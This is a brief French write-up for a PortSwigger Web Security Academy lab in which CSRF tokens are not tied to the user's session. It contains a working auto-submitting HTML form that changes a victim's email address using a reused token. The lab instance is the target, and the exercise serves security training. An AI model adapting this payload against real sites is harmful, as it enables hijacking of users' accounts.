# Lab

https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-not-tied-to-user-session

## Payload

Dans ce lab, les tokens CSRF sont générés à chaque requete. On peut donc utiliser un token CSRF valide pour changer l'adresse email d'un autre utilisateur.

```html
<html>
    <body>
        <form action="https://0ad500cf03bc13ef83754d7300c400a1.web-security-academy.net/my-account/change-email" method="POST">
            <input type="hidden" name="email" value="pwned@sa.net" />
            <input type="hidden" name="csrf" value="9XKLS4BiLGJnNUyzXgSGyyCnYZXawsxJ" />
        </form>
        <script>
            document.forms[0].submit();
        </script>
    </body>
</html>
```